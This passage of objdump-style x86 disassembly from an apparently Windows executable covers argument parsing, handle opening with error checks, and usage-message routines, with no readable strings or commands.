  403291:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403295:	56                   	push   %esi
  403296:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  40329a:	e8 03 0b 00 00       	call   0x403da2
  40329f:	8b 44 24 04          	mov    0x4(%esp),%eax
  4032a3:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  4032a7:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4032ab:	0f b7 00             	movzwl (%eax),%eax
  4032ae:	51                   	push   %ecx
  4032af:	52                   	push   %edx
  4032b0:	50                   	push   %eax
  4032b1:	56                   	push   %esi
  4032b2:	e8 e9 fe ff ff       	call   0x4031a0
  4032b7:	83 c4 10             	add    $0x10,%esp
  4032ba:	5e                   	pop    %esi
  4032bb:	83 c4 0c             	add    $0xc,%esp
  4032be:	c3                   	ret
  4032bf:	cc                   	int3
  4032c0:	81 ec 10 01 00 00    	sub    $0x110,%esp
  4032c6:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  4032cb:	33 c4                	xor    %esp,%eax
  4032cd:	89 84 24 0c 01 00 00 	mov    %eax,0x10c(%esp)
  4032d4:	8b 84 24 18 01 00 00 	mov    0x118(%esp),%eax
  4032db:	53                   	push   %ebx
  4032dc:	55                   	push   %ebp
  4032dd:	8b ac 24 1c 01 00 00 	mov    0x11c(%esp),%ebp
  4032e4:	56                   	push   %esi
  4032e5:	57                   	push   %edi
  4032e6:	68 04 01 00 00       	push   $0x104
  4032eb:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4032ef:	51                   	push   %ecx
  4032f0:	6a 00                	push   $0x0
  4032f2:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4032f6:	ff 15 68 e1 41 00    	call   *0x41e168
  4032fc:	8d 54 24 14          	lea    0x14(%esp),%edx
  403300:	52                   	push   %edx
  403301:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403305:	50                   	push   %eax
  403306:	e8 a3 0a 00 00       	call   0x403dae
  40330b:	8b f8                	mov    %eax,%edi
  40330d:	57                   	push   %edi
  40330e:	e8 d8 0d 00 00       	call   0x4040eb
  403313:	83 c4 04             	add    $0x4,%esp
  403316:	8b f0                	mov    %eax,%esi
  403318:	56                   	push   %esi
  403319:	57                   	push   %edi
  40331a:	6a 00                	push   $0x0
  40331c:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  403320:	51                   	push   %ecx
  403321:	e8 82 0a 00 00       	call   0x403da8
  403326:	68 c8 0b 42 00       	push   $0x420bc8
  40332b:	56                   	push   %esi
  40332c:	e8 3f ff ff ff       	call   0x403270
  403331:	8b f8                	mov    %eax,%edi
  403333:	e8 fd 1e 00 00       	call   0x405235
  403338:	83 c0 40             	add    $0x40,%eax
  40333b:	50                   	push   %eax
  40333c:	68 a0 0a 42 00       	push   $0x420aa0
  403341:	e8 c6 34 00 00       	call   0x40680c
  403346:	e8 ea 1e 00 00       	call   0x405235
  40334b:	83 c0 40             	add    $0x40,%eax
  40334e:	50                   	push   %eax
  40334f:	57                   	push   %edi
  403350:	e8 b7 34 00 00       	call   0x40680c
  403355:	e8 db 1e 00 00       	call   0x405235
  40335a:	83 c0 40             	add    $0x40,%eax
  40335d:	50                   	push   %eax
  40335e:	68 c4 0b 42 00       	push   $0x420bc4
  403363:	e8 a4 34 00 00       	call   0x40680c
  403368:	68 b8 0b 42 00       	push   $0x420bb8
  40336d:	56                   	push   %esi
  40336e:	e8 fd fe ff ff       	call   0x403270
  403373:	8b d8                	mov    %eax,%ebx
  403375:	e8 bb 1e 00 00       	call   0x405235
  40337a:	83 c0 40             	add    $0x40,%eax
  40337d:	50                   	push   %eax
  40337e:	53                   	push   %ebx
  40337f:	e8 88 34 00 00       	call   0x40680c
  403384:	e8 ac 1e 00 00       	call   0x405235
  403389:	83 c0 40             	add    $0x40,%eax
  40338c:	50                   	push   %eax
  40338d:	68 b4 0b 42 00       	push   $0x420bb4
  403392:	e8 75 34 00 00       	call   0x40680c
  403397:	68 a4 0b 42 00       	push   $0x420ba4
  40339c:	56                   	push   %esi
  40339d:	e8 ce fe ff ff       	call   0x403270
  4033a2:	83 c4 40             	add    $0x40,%esp
  4033a5:	8b d8                	mov    %eax,%ebx
  4033a7:	e8 89 1e 00 00       	call   0x405235
  4033ac:	83 c0 40             	add    $0x40,%eax
  4033af:	50                   	push   %eax
  4033b0:	53                   	push   %ebx
  4033b1:	e8 56 34 00 00       	call   0x40680c
  4033b6:	e8 7a 1e 00 00       	call   0x405235
  4033bb:	83 c0 40             	add    $0x40,%eax
  4033be:	50                   	push   %eax
  4033bf:	68 a0 0a 42 00       	push   $0x420aa0
  4033c4:	e8 43 34 00 00       	call   0x40680c
  4033c9:	68 94 0b 42 00       	push   $0x420b94
  4033ce:	56                   	push   %esi
  4033cf:	e8 9c fe ff ff       	call   0x403270
  4033d4:	8b d8                	mov    %eax,%ebx
  4033d6:	e8 5a 1e 00 00       	call   0x405235
  4033db:	83 c0 40             	add    $0x40,%eax
  4033de:	50                   	push   %eax
  4033df:	53                   	push   %ebx
  4033e0:	e8 27 34 00 00       	call   0x40680c
  4033e5:	e8 4b 1e 00 00       	call   0x405235
  4033ea:	83 c0 40             	add    $0x40,%eax
  4033ed:	50                   	push   %eax
  4033ee:	68 a0 0a 42 00       	push   $0x420aa0
  4033f3:	e8 14 34 00 00       	call   0x40680c
  4033f8:	68 88 0b 42 00       	push   $0x420b88
  4033fd:	56                   	push   %esi
  4033fe:	e8 6d fe ff ff       	call   0x403270
  403403:	8b d8                	mov    %eax,%ebx
  403405:	e8 2b 1e 00 00       	call   0x405235
  40340a:	83 c0 40             	add    $0x40,%eax
  40340d:	50                   	push   %eax
  40340e:	53                   	push   %ebx
  40340f:	e8 f8 33 00 00       	call   0x40680c
  403414:	e8 1c 1e 00 00       	call   0x405235
  403419:	83 c0 40             	add    $0x40,%eax
  40341c:	50                   	push   %eax
  40341d:	68 84 0b 42 00       	push   $0x420b84
  403422:	e8 e5 33 00 00       	call   0x40680c
  403427:	83 c4 40             	add    $0x40,%esp
  40342a:	e8 06 1e 00 00       	call   0x405235
  40342f:	83 c0 40             	add    $0x40,%eax
  403432:	50                   	push   %eax
  403433:	e8 52 2b 00 00       	call   0x405f8a
  403438:	83 c4 04             	add    $0x4,%esp
  40343b:	ff 15 14 e1 41 00    	call   *0x41e114
  403441:	3d 00 00 00 80       	cmp    $0x80000000,%eax
  403446:	72 1e                	jb     0x403466
  403448:	57                   	push   %edi
  403449:	68 5c 0b 42 00       	push   $0x420b5c
  40344e:	e8 e2 1d 00 00       	call   0x405235
  403453:	83 c0 40             	add    $0x40,%eax
  403456:	50                   	push   %eax
  403457:	e8 33 1c 00 00       	call   0x40508f
  40345c:	83 c4 0c             	add    $0xc,%esp
  40345f:	6a 01                	push   $0x1
  403461:	e8 0e 33 00 00       	call   0x406774
  403466:	85 ed                	test   %ebp,%ebp
  403468:	74 30                	je     0x40349a
  40346a:	8b 54 24 10          	mov    0x10(%esp),%edx
  40346e:	52                   	push   %edx
  40346f:	55                   	push   %ebp
  403470:	57                   	push   %edi
  403471:	e8 2a e8 ff ff       	call   0x401ca0
  403476:	83 c4 0c             	add    $0xc,%esp
  403479:	85 c0                	test   %eax,%eax
  40347b:	75 1d                	jne    0x40349a
  40347d:	68 48 0b 42 00       	push   $0x420b48
  403482:	e8 ae 1d 00 00       	call   0x405235
  403487:	83 c0 40             	add    $0x40,%eax
  40348a:	50                   	push   %eax
  40348b:	e8 ff 1b 00 00       	call   0x40508f
  403490:	83 c4 08             	add    $0x8,%esp
  403493:	6a 01                	push   $0x1
  403495:	e8 da 32 00 00       	call   0x406774
  40349a:	56                   	push   %esi
  40349b:	e8 f4 0a 00 00       	call   0x403f94
  4034a0:	8b 8c 24 20 01 00 00 	mov    0x120(%esp),%ecx
  4034a7:	83 c4 04             	add    $0x4,%esp
  4034aa:	5f                   	pop    %edi
  4034ab:	5e                   	pop    %esi
  4034ac:	5d                   	pop    %ebp
  4034ad:	5b                   	pop    %ebx
  4034ae:	33 cc                	xor    %esp,%ecx
  4034b0:	e8 61 0f 00 00       	call   0x404416
  4034b5:	81 c4 10 01 00 00    	add    $0x110,%esp
  4034bb:	c3                   	ret
  4034bc:	cc                   	int3
  4034bd:	cc                   	int3
  4034be:	cc                   	int3
  4034bf:	cc                   	int3
  4034c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4034c4:	57                   	push   %edi
  4034c5:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4034c9:	57                   	push   %edi
  4034ca:	50                   	push   %eax
  4034cb:	ff 15 c0 e0 41 00    	call   *0x41e0c0
  4034d1:	85 c0                	test   %eax,%eax
  4034d3:	74 07                	je     0x4034dc
  4034d5:	5f                   	pop    %edi
  4034d6:	ff 25 18 e1 41 00    	jmp    *0x41e118
  4034dc:	56                   	push   %esi
  4034dd:	8b 35 18 e1 41 00    	mov    0x41e118,%esi
  4034e3:	ff d6                	call   *%esi
  4034e5:	3d 17 02 00 00       	cmp    $0x217,%eax
  4034ea:	75 0a                	jne    0x4034f6
  4034ec:	8b 4f 10             	mov    0x10(%edi),%ecx
  4034ef:	51                   	push   %ecx
  4034f0:	ff 15 bc e0 41 00    	call   *0x41e0bc
  4034f6:	ff d6                	call   *%esi
  4034f8:	5e                   	pop    %esi
  4034f9:	5f                   	pop    %edi
  4034fa:	c3                   	ret
  4034fb:	cc                   	int3
  4034fc:	cc                   	int3
  4034fd:	cc                   	int3
  4034fe:	cc                   	int3
  4034ff:	cc                   	int3
  403500:	81 ec 24 02 00 00    	sub    $0x224,%esp
  403506:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  40350b:	33 c4                	xor    %esp,%eax
  40350d:	89 84 24 20 02 00 00 	mov    %eax,0x220(%esp)
  403514:	57                   	push   %edi
  403515:	8b bc 24 2c 02 00 00 	mov    0x22c(%esp),%edi
  40351c:	6a 01                	push   $0x1
  40351e:	6a ff                	push   $0xffffffff
  403520:	6a 00                	push   $0x0
  403522:	68 60 6e 42 00       	push   $0x426e60
  403527:	68 d0 61 42 00       	push   $0x4261d0
  40352c:	68 c8 0d 42 00       	push   $0x420dc8
  403531:	68 b8 0d 42 00       	push   $0x420db8
  403536:	68 ac 0d 42 00       	push   $0x420dac
  40353b:	68 a4 0d 42 00       	push   $0x420da4
  403540:	68 c8 60 42 00       	push   $0x4260c8
  403545:	6a 01                	push   $0x1
  403547:	e8 44 f3 ff ff       	call   0x402890
  40354c:	83 c4 2c             	add    $0x2c,%esp
  40354f:	84 c0                	test   %al,%al
  403551:	75 18                	jne    0x40356b
  403553:	33 c0                	xor    %eax,%eax
  403555:	5f                   	pop    %edi
  403556:	8b 8c 24 20 02 00 00 	mov    0x220(%esp),%ecx
  40355d:	33 cc                	xor    %esp,%ecx
  40355f:	e8 b2 0e 00 00       	call   0x404416
  403564:	81 c4 24 02 00 00    	add    $0x224,%esp
  40356a:	c3                   	ret
  40356b:	56                   	push   %esi
  40356c:	e8 4f ed ff ff       	call   0x4022c0
  403571:	68 c8 60 42 00       	push   $0x4260c8
  403576:	68 78 0d 42 00       	push   $0x420d78
  40357b:	e8 66 2a 00 00       	call   0x405fe6
  403580:	68 c8 60 42 00       	push   $0x4260c8
  403585:	8d 84 24 30 01 00 00 	lea    0x130(%esp),%eax
  40358c:	68 64 0d 42 00       	push   $0x420d64
  403591:	50                   	push   %eax
  403592:	e8 be 14 00 00       	call   0x404a55
  403597:	83 c4 14             	add    $0x14,%esp
  40359a:	6a 00                	push   $0x0
  40359c:	6a 00                	push   $0x0
  40359e:	6a 03                	push   $0x3
  4035a0:	6a 00                	push   $0x0
  4035a2:	6a 00                	push   $0x0
  4035a4:	68 00 00 00 c0       	push   $0xc0000000
  4035a9:	8d 8c 24 3c 01 00 00 	lea    0x13c(%esp),%ecx
  4035b0:	51                   	push   %ecx
  4035b1:	ff 15 74 e0 41 00    	call   *0x41e074
  4035b7:	8b f0                	mov    %eax,%esi
  4035b9:	e8 02 ed ff ff       	call   0x4022c0
  4035be:	83 fe ff             	cmp    $0xffffffff,%esi
  4035c1:	75 5d                	jne    0x403620
  4035c3:	68 c8 60 42 00       	push   $0x4260c8
  4035c8:	68 24 0d 42 00       	push   $0x420d24
  4035cd:	e8 14 2a 00 00       	call   0x405fe6
  4035d2:	83 c4 08             	add    $0x8,%esp
  4035d5:	ff 15 18 e1 41 00    	call   *0x41e118
  4035db:	50                   	push   %eax
  4035dc:	e8 4f ec ff ff       	call   0x402230
  4035e1:	83 c4 04             	add    $0x4,%esp
  4035e4:	68 b8 0d 42 00       	push   $0x420db8
  4035e9:	68 ac 0d 42 00       	push   $0x420dac
  4035ee:	68 c8 60 42 00       	push   $0x4260c8
  4035f3:	6a 01                	push   $0x1
  4035f5:	e8 06 ef ff ff       	call   0x402500
  4035fa:	68 a0 0a 42 00       	push   $0x420aa0
  4035ff:	e8 e2 29 00 00       	call   0x405fe6
  403604:	83 c4 14             	add    $0x14,%esp
  403607:	5e                   	pop    %esi
  403608:	33 c0                	xor    %eax,%eax
  40360a:	5f                   	pop    %edi
  40360b:	8b 8c 24 20 02 00 00 	mov    0x220(%esp),%ecx
  403612:	33 cc                	xor    %esp,%ecx
  403614:	e8 fd 0d 00 00       	call   0x404416
  403619:	81 c4 24 02 00 00    	add    $0x224,%esp
  40361f:	c3                   	ret
  403620:	83 3d d4 62 42 00 00 	cmpl   $0x0,0x4262d4
  403627:	a0 ce 61 42 00       	mov    0x4261ce,%al
  40362c:	88 84 24 18 01 00 00 	mov    %al,0x118(%esp)
  403633:	74 44                	je     0x403679
  403635:	84 c0                	test   %al,%al
  403637:	b8 1c 0d 42 00       	mov    $0x420d1c,%eax
  40363c:	75 05                	jne    0x403643
  40363e:	b8 1b 0d 42 00       	mov    $0x420d1b,%eax
  403643:	8b 15 44 6e 42 00    	mov    0x426e44,%edx
  403649:	68 c8 60 42 00       	push   $0x4260c8
  40364e:	52                   	push   %edx
  40364f:	50                   	push   %eax
  403650:	68 fc 0c 42 00       	push   $0x420cfc
  403655:	e8 8c 29 00 00       	call   0x405fe6
  40365a:	a1 d4 62 42 00       	mov    0x4262d4,%eax
  40365f:	8d 54 24 1d          	lea    0x1d(%esp),%edx
  403663:	83 c4 10             	add    $0x10,%esp
  403666:	2b d0                	sub    %eax,%edx
  403668:	8a 08                	mov    (%eax),%cl
  40366a:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  40366d:	40                   	inc    %eax
  40366e:	84 c9                	test   %cl,%cl
  403670:	75 f6                	jne    0x403668
  403672:	c6 44 24 0c 01       	movb   $0x1,0xc(%esp)
  403677:	eb 3a                	jmp    0x4036b3
  403679:	84 c0                	test   %al,%al
  40367b:	b8 1c 0d 42 00       	mov    $0x420d1c,%eax
  403680:	75 05                	jne    0x403687
  403682:	b8 1b 0d 42 00       	mov    $0x420d1b,%eax
  403687:	8b 0d 44 6e 42 00    	mov    0x426e44,%ecx
  40368d:	68 c8 60 42 00       	push   $0x4260c8
  403692:	51                   	push   %ecx
  403693:	50                   	push   %eax
  403694:	68 fc 0c 42 00       	push   $0x420cfc
  403699:	e8 48 29 00 00       	call   0x405fe6
  40369e:	8b 15 44 6e 42 00    	mov    0x426e44,%edx
  4036a4:	83 c4 10             	add    $0x10,%esp
  4036a7:	c6 44 24 0c 00       	movb   $0x0,0xc(%esp)
  4036ac:	89 94 24 14 01 00 00 	mov    %edx,0x114(%esp)
  4036b3:	6a 00                	push   $0x0
  4036b5:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4036b9:	50                   	push   %eax
  4036ba:	68 18 01 00 00       	push   $0x118
  4036bf:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4036c3:	51                   	push   %ecx
  4036c4:	56                   	push   %esi
  4036c5:	ff 15 7c e0 41 00    	call   *0x41e07c
  4036cb:	85 c0                	test   %eax,%eax
  4036cd:	75 14                	jne    0x4036e3
  4036cf:	e8 ec eb ff ff       	call   0x4022c0
  4036d4:	68 c8 60 42 00       	push   $0x4260c8
  4036d9:	68 c8 0c 42 00       	push   $0x420cc8
  4036de:	e9 ea fe ff ff       	jmp    0x4035cd
  4036e3:	6a 00                	push   $0x0
  4036e5:	8d 54 24 0c          	lea    0xc(%esp),%edx
  4036e9:	52                   	push   %edx
  4036ea:	68 18 01 00 00       	push   $0x118
  4036ef:	8d 44 24 18          	lea    0x18(%esp),%eax
  4036f3:	50                   	push   %eax
  4036f4:	56                   	push   %esi
  4036f5:	ff 15 c4 e0 41 00    	call   *0x41e0c4
  4036fb:	85 c0                	test   %eax,%eax
  4036fd:	75 14                	jne    0x403713
  4036ff:	e8 bc eb ff ff       	call   0x4022c0
  403704:	68 c8 60 42 00       	push   $0x4260c8
  403709:	68 70 0c 42 00       	push   $0x420c70
  40370e:	e9 ba fe ff ff       	jmp    0x4035cd
  403713:	83 bc 24 1c 01 00 00 	cmpl   $0x0,0x11c(%esp)
  40371a:	00 
  40371b:	74 79                	je     0x403796
  40371d:	e8 9e eb ff ff       	call   0x4022c0
  403722:	a1 d4 62 42 00       	mov    0x4262d4,%eax
  403727:	68 c8 60 42 00       	push   $0x4260c8
  40372c:	85 c0                	test   %eax,%eax
  40372e:	74 08                	je     0x403738
  403730:	50                   	push   %eax
  403731:	68 44 0c 42 00       	push   $0x420c44
  403736:	eb 0c                	jmp    0x403744
  403738:	8b 0d 44 6e 42 00    	mov    0x426e44,%ecx
  40373e:	51                   	push   %ecx
  40373f:	68 20 0c 42 00       	push   $0x420c20
  403744:	e8 9d 28 00 00       	call   0x405fe6
  403749:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  403750:	83 c4 0c             	add    $0xc,%esp
  403753:	83 f8 57             	cmp    $0x57,%eax
  403756:	0f 85 7f fe ff ff    	jne    0x4035db
  40375c:	a1 d4 62 42 00       	mov    0x4262d4,%eax
  403761:	68 c8 60 42 00       	push   $0x4260c8
  403766:	85 c0                	test   %eax,%eax
  403768:	74 13                	je     0x40377d
  40376a:	50                   	push   %eax
  40376b:	68 fc 0b 42 00       	push   $0x420bfc
  403770:	e8 71 28 00 00       	call   0x405fe6
  403775:	83 c4 0c             	add    $0xc,%esp
  403778:	e9 67 fe ff ff       	jmp    0x4035e4
  40377d:	8b 15 44 6e 42 00    	mov    0x426e44,%edx
  403783:	52                   	push   %edx
  403784:	68 d8 0b 42 00       	push   $0x420bd8
  403789:	e8 58 28 00 00       	call   0x405fe6
  40378e:	83 c4 0c             	add    $0xc,%esp
  403791:	e9 4e fe ff ff       	jmp    0x4035e4
  403796:	8b 84 24 20 01 00 00 	mov    0x120(%esp),%eax
  40379d:	68 b8 0d 42 00       	push   $0x420db8
  4037a2:	68 ac 0d 42 00       	push   $0x420dac
  4037a7:	68 c8 60 42 00       	push   $0x4260c8
  4037ac:	6a 01                	push   $0x1
  4037ae:	89 07                	mov    %eax,(%edi)
  4037b0:	e8 4b ed ff ff       	call   0x402500
  4037b5:	8b 8c 24 38 02 00 00 	mov    0x238(%esp),%ecx
  4037bc:	83 c4 10             	add    $0x10,%esp
  4037bf:	5e                   	pop    %esi
  4037c0:	5f                   	pop    %edi
  4037c1:	33 cc                	xor    %esp,%ecx
  4037c3:	b8 01 00 00 00       	mov    $0x1,%eax
  4037c8:	e8 49 0c 00 00       	call   0x404416
  4037cd:	81 c4 24 02 00 00    	add    $0x224,%esp
  4037d3:	c3                   	ret
  4037d4:	cc                   	int3
  4037d5:	cc                   	int3
  4037d6:	cc                   	int3
  4037d7:	cc                   	int3
  4037d8:	cc                   	int3
  4037d9:	cc                   	int3
  4037da:	cc                   	int3
  4037db:	cc                   	int3
  4037dc:	cc                   	int3
  4037dd:	cc                   	int3
  4037de:	cc                   	int3
  4037df:	cc                   	int3
  4037e0:	68 e0 0e 42 00       	push   $0x420ee0
  4037e5:	e8 fc 27 00 00       	call   0x405fe6
  4037ea:	68 ac 0e 42 00       	push   $0x420eac
  4037ef:	e8 f2 27 00 00       	call   0x405fe6
  4037f4:	68 58 0e 42 00       	push   $0x420e58
  4037f9:	e8 e8 27 00 00       	call   0x405fe6
  4037fe:	68 10 0e 42 00       	push   $0x420e10
  403803:	e8 de 27 00 00       	call   0x405fe6
  403808:	68 d0 0d 42 00       	push   $0x420dd0
  40380d:	e8 d4 27 00 00       	call   0x405fe6
  403812:	68 a0 0a 42 00       	push   $0x420aa0
  403817:	e8 ca 27 00 00       	call   0x405fe6
  40381c:	83 c4 18             	add    $0x18,%esp
  40381f:	32 c0                	xor    %al,%al
  403821:	c3                   	ret
  403822:	cc                   	int3
  403823:	cc                   	int3
  403824:	cc                   	int3
  403825:	cc                   	int3
  403826:	cc                   	int3
  403827:	cc                   	int3
  403828:	cc                   	int3
  403829:	cc                   	int3
  40382a:	cc                   	int3
  40382b:	cc                   	int3
  40382c:	cc                   	int3
  40382d:	cc                   	int3
  40382e:	cc                   	int3
  40382f:	cc                   	int3
  403830:	83 ec 08             	sub    $0x8,%esp
  403833:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403837:	53                   	push   %ebx
  403838:	bb 01 00 00 00       	mov    $0x1,%ebx
  40383d:	3b c3                	cmp    %ebx,%eax
  40383f:	c6 44 24 07 00       	movb   $0x0,0x7(%esp)
  403844:	c6 44 24 06 00       	movb   $0x0,0x6(%esp)
  403849:	7f 14                	jg     0x40385f
  40384b:	8b 44 24 14          	mov    0x14(%esp),%eax
  40384f:	8b 08                	mov    (%eax),%ecx
  403851:	51                   	push   %ecx
  403852:	e8 89 ff ff ff       	call   0x4037e0
  403857:	83 c4 04             	add    $0x4,%esp
  40385a:	5b                   	pop    %ebx
  40385b:	83 c4 08             	add    $0x8,%esp
  40385e:	c3                   	ret
  40385f:	3b c3                	cmp    %ebx,%eax
  403861:	55                   	push   %ebp
  403862:	56                   	push   %esi
  403863:	57                   	push   %edi
  403864:	c6 05 60 6e 42 00 00 	movb   $0x0,0x426e60
  40386b:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  40386f:	0f 8e a9 01 00 00    	jle    0x403a1e
  403875:	8b 7c 24 20          	mov    0x20(%esp),%edi
  403879:	bd 02 00 00 00       	mov    $0x2,%ebp
  40387e:	83 c7 04             	add    $0x4,%edi
  403881:	8b 07                	mov    (%edi),%eax
  403883:	0f be 08             	movsbl (%eax),%ecx
  403886:	83 e9 2d             	sub    $0x2d,%ecx
  403889:	0f 84 bf 00 00 00    	je     0x40394e
  40388f:	83 e9 02             	sub    $0x2,%ecx
  403892:	0f 84 b6 00 00 00    	je     0x40394e
  403898:	33 f6                	xor    %esi,%esi
  40389a:	8d 50 01             	lea    0x1(%eax),%edx
  40389d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4038a0:	8a 08                	mov    (%eax),%cl
  4038a2:	40                   	inc    %eax
  4038a3:	84 c9                	test   %cl,%cl
  4038a5:	75 f9                	jne    0x4038a0
  4038a7:	2b c2                	sub    %edx,%eax
  4038a9:	85 c0                	test   %eax,%eax
  4038ab:	7e 30                	jle    0x4038dd
  4038ad:	8d 49 00             	lea    0x0(%ecx),%ecx
  4038b0:	8b 17                	mov    (%edi),%edx
  4038b2:	0f be 04 32          	movsbl (%edx,%esi,1),%eax
  4038b6:	50                   	push   %eax
  4038b7:	e8 f7 33 00 00       	call   0x406cb3
  4038bc:	83 c4 04             	add    $0x4,%esp
  4038bf:	85 c0                	test   %eax,%eax
  4038c1:	8b 07                	mov    (%edi),%eax
  4038c3:	74 3c                	je     0x403901
  4038c5:	03 f3                	add    %ebx,%esi
  4038c7:	8d 50 01             	lea    0x1(%eax),%edx
  4038ca:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4038d0:	8a 08                	mov    (%eax),%cl
  4038d2:	40                   	inc    %eax
  4038d3:	84 c9                	test   %cl,%cl
  4038d5:	75 f9                	jne    0x4038d0
  4038d7:	2b c2                	sub    %edx,%eax
  4038d9:	3b f0                	cmp    %eax,%esi
  4038db:	7c d3                	jl     0x4038b0
  4038dd:	80 7c 24 12 00       	cmpb   $0x0,0x12(%esp)
  4038e2:	0f 85 81 01 00 00    	jne    0x403a69
  4038e8:	8b 0f                	mov    (%edi),%ecx
  4038ea:	51                   	push   %ecx
  4038eb:	e8 a9 31 00 00       	call   0x406a99
  4038f0:	83 c4 04             	add    $0x4,%esp
  4038f3:	a3 44 6e 42 00       	mov    %eax,0x426e44
  4038f8:	88 5c 24 12          	mov    %bl,0x12(%esp)
  4038fc:	e9 fd 00 00 00       	jmp    0x4039fe
  403901:	80 38 5c             	cmpb   $0x5c,(%eax)
  403904:	75 2f                	jne    0x403935
  403906:	80 78 01 5c          	cmpb   $0x5c,0x1(%eax)
  40390a:	75 29                	jne    0x403935
  40390c:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  403911:	0f 85 07 01 00 00    	jne    0x403a1e
  403917:	8d 48 02             	lea    0x2(%eax),%ecx
  40391a:	ba c8 60 42 00       	mov    $0x4260c8,%edx
  40391f:	90                   	nop
  403920:	8a 01                	mov    (%ecx),%al
  403922:	88 02                	mov    %al,(%edx)
  403924:	03 cb                	add    %ebx,%ecx
  403926:	03 d3                	add    %ebx,%edx
  403928:	84 c0                	test   %al,%al
  40392a:	75 f4                	jne    0x403920
  40392c:	88 5c 24 13          	mov    %bl,0x13(%esp)
  403930:	e9 c9 00 00 00       	jmp    0x4039fe
  403935:	80 7c 24 12 00       	cmpb   $0x0,0x12(%esp)
  40393a:	0f 85 05 01 00 00    	jne    0x403a45
  403940:	a3 d4 62 42 00       	mov    %eax,0x4262d4
  403945:	88 5c 24 12          	mov    %bl,0x12(%esp)
  403949:	e9 b0 00 00 00       	jmp    0x4039fe
  40394e:	80 78 01 00          	cmpb   $0x0,0x1(%eax)
  403952:	8b f3                	mov    %ebx,%esi
  403954:	0f 84 a4 00 00 00    	je     0x4039fe
  40395a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403960:	8b 17                	mov    (%edi),%edx
  403962:	0f be 04 32          	movsbl (%edx,%esi,1),%eax
  403966:	50                   	push   %eax
  403967:	e8 d2 30 00 00       	call   0x406a3e
  40396c:	83 c4 04             	add    $0x4,%esp
  40396f:	83 e8 50             	sub    $0x50,%eax
  403972:	74 50                	je     0x4039c4
  403974:	83 e8 04             	sub    $0x4,%eax
  403977:	75 11                	jne    0x40398a
  403979:	88 1d ce 61 42 00    	mov    %bl,0x4261ce
  40397f:	8b 0f                	mov    (%edi),%ecx
  403981:	03 f3                	add    %ebx,%esi
  403983:	38 04 0e             	cmp    %al,(%esi,%ecx,1)
  403986:	75 d8                	jne    0x403960
  403988:	eb 74                	jmp    0x4039fe
  40398a:	2b c3                	sub    %ebx,%eax
  40398c:	0f 85 8c 00 00 00    	jne    0x403a1e
  403992:	3b 6c 24 1c          	cmp    0x1c(%esp),%ebp
  403996:	0f 8f a9 00 00 00    	jg     0x403a45
  40399c:	38 05 cc 61 42 00    	cmp    %al,0x4261cc
  4039a2:	0f 85 9d 00 00 00    	jne    0x403a45
  4039a8:	8b 4f 04             	mov    0x4(%edi),%ecx
  4039ab:	ba d0 61 42 00       	mov    $0x4261d0,%edx
  4039b0:	8a 01                	mov    (%ecx),%al
  4039b2:	88 02                	mov    %al,(%edx)
  4039b4:	03 cb                	add    %ebx,%ecx
  4039b6:	03 d3                	add    %ebx,%edx
  4039b8:	84 c0                	test   %al,%al
  4039ba:	75 f4                	jne    0x4039b0
  4039bc:	88 1d cc 61 42 00    	mov    %bl,0x4261cc
  4039c2:	eb 31                	jmp    0x4039f5
  4039c4:	3b 6c 24 1c          	cmp    0x1c(%esp),%ebp
  4039c8:	0f 8f 9b 00 00 00    	jg     0x403a69
  4039ce:	80 3d cd 61 42 00 00 	cmpb   $0x0,0x4261cd
  4039d5:	0f 85 8e 00 00 00    	jne    0x403a69
  4039db:	8b 4f 04             	mov    0x4(%edi),%ecx
  4039de:	ba 60 6e 42 00       	mov    $0x426e60,%edx
  4039e3:	8a 01                	mov    (%ecx),%al
  4039e5:	88 02                	mov    %al,(%edx)
  4039e7:	03 cb                	add    %ebx,%ecx
  4039e9:	03 d3                	add    %ebx,%edx
  4039eb:	84 c0                	test   %al,%al
  4039ed:	75 f4                	jne    0x4039e3
  4039ef:	88 1d cd 61 42 00    	mov    %bl,0x4261cd
  4039f5:	01 5c 24 14          	add    %ebx,0x14(%esp)
  4039f9:	03 eb                	add    %ebx,%ebp
  4039fb:	83 c7 04             	add    $0x4,%edi
  4039fe:	8b 44 24 14          	mov    0x14(%esp),%eax
  403a02:	03 c3                	add    %ebx,%eax
  403a04:	03 eb                	add    %ebx,%ebp
  403a06:	83 c7 04             	add    $0x4,%edi
  403a09:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  403a0d:	89 44 24 14          	mov    %eax,0x14(%esp)
  403a11:	0f 8c 6a fe ff ff    	jl     0x403881
  403a17:	80 7c 24 12 00       	cmpb   $0x0,0x12(%esp)
  403a1c:	75 17                	jne    0x403a35
  403a1e:	8b 54 24 20          	mov    0x20(%esp),%edx
  403a22:	8b 02                	mov    (%edx),%eax
  403a24:	50                   	push   %eax
  403a25:	e8 b6 fd ff ff       	call   0x4037e0
  403a2a:	83 c4 04             	add    $0x4,%esp
  403a2d:	5f                   	pop    %edi
  403a2e:	5e                   	pop    %esi
  403a2f:	5d                   	pop    %ebp
  403a30:	5b                   	pop    %ebx
  403a31:	83 c4 08             	add    $0x8,%esp
  403a34:	c3                   	ret
  403a35:	a0 cc 61 42 00       	mov    0x4261cc,%al
  403a3a:	84 c0                	test   %al,%al
  403a3c:	74 1e                	je     0x403a5c
  403a3e:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  403a43:	75 17                	jne    0x403a5c
